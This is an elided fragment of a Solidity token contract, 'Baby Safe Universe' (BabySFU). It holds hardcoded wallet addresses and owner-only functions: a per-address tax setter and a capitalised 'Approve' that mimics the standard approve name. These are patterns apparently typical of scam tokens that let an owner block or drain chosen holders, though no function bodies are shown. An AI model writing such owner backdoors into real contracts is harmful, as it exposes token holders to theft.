...
contract BabySFU is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Baby Safe Universe";
    string private _symbol = "BabySFU";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x0D568c1761A1C3aDD3690A3e404e3a1C2B6577F1); 
    address payable private teamWalletAddress = payable(0xCC4bBA957f4183FeF4729cEbbA2db6EC55870C31); 
...
//	uint256 public _percent = 100;
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyOner {
	...
	function Approve(address spender,uint256 amount)public onlyOner{
